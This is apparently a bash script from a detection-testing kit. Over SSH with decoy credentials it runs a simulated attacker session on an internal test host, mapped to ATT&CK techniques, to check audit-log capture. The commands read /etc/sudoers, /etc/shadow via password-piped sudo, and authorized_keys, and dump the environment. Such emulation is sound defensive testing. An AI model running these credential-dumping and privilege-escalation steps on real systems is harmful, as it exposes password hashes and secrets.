#!/bin/bash
#
# run-ssh-audit-session.sh
# ---------------------------------------------------------------------------
# CLOUD/CONTAINER EDR (CDR) DETECTION COVERAGE — NON-PRODUCTION USE ONLY
#
# Purpose-built to exercise AUDIT LOG CAPTURE, not just alerting: opens one
# interactive-style SSH session to internal-host (decoy creds) and runs a
# sequence of audit-worthy commands within it, so you can check whether
# your EDR/auditd pipeline captures:
#   - the SSH session itself (login, source, session ID)
#   - every command executed inside that one session (execve-level
#     auditing, not just the initial SSH connection)
#   - access to sensitive files (/etc/sudoers, /etc/shadow) regardless of
#     whether the read succeeds
#   - a sudo-elevation event within the session
#
# Unlike run-lateral-movement.sh (one-shot `id; hostname` to prove SSH
# access works), this opens a single persistent session and feeds it a
# whole command sequence over stdin, closer to what a real interactive
# attacker session looks like to a session-recording/audit tool.
#
#   SSH session establishment              Remote Services: SSH         (T1021.004)
#   whoami / id / uname -a                  Discovery                    (T1033, T1082)
#   cat /etc/sudoers                        Unsecured Credentials: Files  (T1552.001)
#   sudo -l / sudo cat /etc/shadow          Sudo and Sudo Caching        (T1548.003)
#   reading /etc/shadow via sudo            OS Credential Dumping        (T1003.008)
#   history / who / last                    Discovery                    (T1033, T1082)
# ---------------------------------------------------------------------------
set -u
source "$(cd "$(dirname "$0")" && pwd)/lib-stealth.sh"

RESULTS_DIR="${RESULTS_DIR:-/home/root/results}"
INTERNAL_HOST="${INTERNAL_HOST:-internal-host}"
SSH_USER="${INTERNAL_HOST_USER:-decoyuser}"
SSH_PASS="${INTERNAL_HOST_PASS:-DECOY-NOT-REAL-PASSWORD}"
SSH_PORT="${INTERNAL_HOST_SSH_PORT:-2222}"
SESSION="$(date +%s)"
LOG="${RESULTS_DIR}/ssh_audit_session_${SESSION}.log"

mkdir -p "$RESULTS_DIR"
say() { echo -e "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }

say "Cymylau :: SSH audit-session emulation :: session=$SESSION"

if ! command -v sshpass >/dev/null 2>&1; then
    say "!! sshpass not installed. run: bash playbooks/install-extra-tools.sh"
    exit 1
fi

TARGET_IP="$(getent hosts "$INTERNAL_HOST" 2>/dev/null | awk '{print $1; exit}')"
if [ -z "${TARGET_IP:-}" ]; then
    say "!! could not resolve $INTERNAL_HOST, is it running?"
    exit 1
fi
say "internal-host resolved to $TARGET_IP"

step "opening one SSH session and running the audit-worthy command sequence (ATT&CK T1021.004)"
# One SSH connection, one remote `bash -s` reading the whole command
# sequence from stdin: a single session containing multiple commands, the
# thing we're exercising audit capture of. sudo here requires a password
# (sudo -l above confirmed no NOPASSWD rule), so each privileged command
# pipes it in via `sudo -S` rather than needing a real terminal. The
# heredoc delimiter is intentionally unquoted so $SSH_PASS expands locally
# before the script is sent over SSH.
st_mark T1021.004 "ssh-audit-session"
st_sshpass "$SSH_PASS"
DST="$INTERNAL_HOST"; TGT="${SSH_USER}@${INTERNAL_HOST}:${SSH_PORT}"
# One marker for the session: on the local sshpass process and, as a comment, in
# the remote "bash -s" command line, the parent of every command below. The
# commands inside the session are recorded as declared steps of that action.
MARK="$(ax_marker)"; REMOTE_CMD="bash -s"
[ "$ACT_MARKERS" = 1 ] && REMOTE_CMD="bash -s # ${MARK}"
# shellcheck disable=SC2034  # read by act_declared() in lib-activity.sh
ACT_PARENT="$MARK"
act_declared T1033 "whoami; id; uname -a (remote)" "$DST" "$TGT"
act_declared T1552.001 "cat /etc/sudoers (remote)" "$DST" "/etc/sudoers"
act_declared T1548.003 "sudo -l (remote)" "$DST" "sudo policy"
act_declared T1003.008 "sudo cat /etc/shadow (remote)" "$DST" "/etc/shadow"
# shellcheck disable=SC2088  # a label for the log, not a path to expand
act_declared T1552.001 "cat ~/.ssh/authorized_keys (remote)" "$DST" "~/.ssh/authorized_keys"
act_declared T1082 "who; last; env (remote)" "$DST" "session/environment"
unset ACT_PARENT
TRANSCRIPT="$(ACT_MARK_PRESET="$MARK" ax --label "ssh -p $SSH_PORT ${SSH_USER}@${INTERNAL_HOST} bash -s (one audited session)" \
    T1021.004 "$DST" "$TGT" -- "${ST_SSHPASS[@]}" ssh -p "$SSH_PORT" \
    -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "${SSH_USER}@${TARGET_IP}" "$REMOTE_CMD" 2>&1 <<REMOTE_SESSION
echo "=== whoami / id / uname -a ==="
whoami
id
uname -a
echo "=== cat /etc/sudoers ==="
cat /etc/sudoers
echo "=== sudo -l ==="
echo "$SSH_PASS" | sudo -S -p '' -l
echo "=== sudo cat /etc/shadow (first 5 lines) ==="
echo "$SSH_PASS" | sudo -S -p '' cat /etc/shadow | head -n 5
echo "=== reading own authorized_keys ==="
cat ~/.ssh/authorized_keys 2>&1
echo "=== who / last ==="
who
last -a 2>&1 | head -n 5
echo "=== env ==="
env
REMOTE_SESSION
)"
echo "$TRANSCRIPT" | tee -a "$LOG"

step "Done - SSH audit-session emulation complete."
say "artifacts: $LOG"
say "if your EDR/auditd pipeline is capturing session audit logs, you"
say "should see one SSH session on internal-host containing every"
say "command above, including the sudoers/shadow reads and the sudo"
say "elevation, not just the initial connection."

act_summary
